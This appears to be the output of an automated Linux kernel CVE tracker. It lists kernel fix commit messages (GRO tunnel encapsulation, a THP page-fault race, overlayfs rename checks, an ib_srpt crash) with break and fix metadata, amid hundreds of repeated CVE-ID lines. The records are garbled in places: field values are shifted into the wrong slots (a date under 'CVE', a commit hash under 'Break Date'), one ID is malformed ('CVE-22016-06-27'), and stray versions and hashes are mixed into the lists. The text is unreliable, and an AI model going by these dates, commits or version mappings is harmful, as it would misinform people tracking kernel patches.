The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
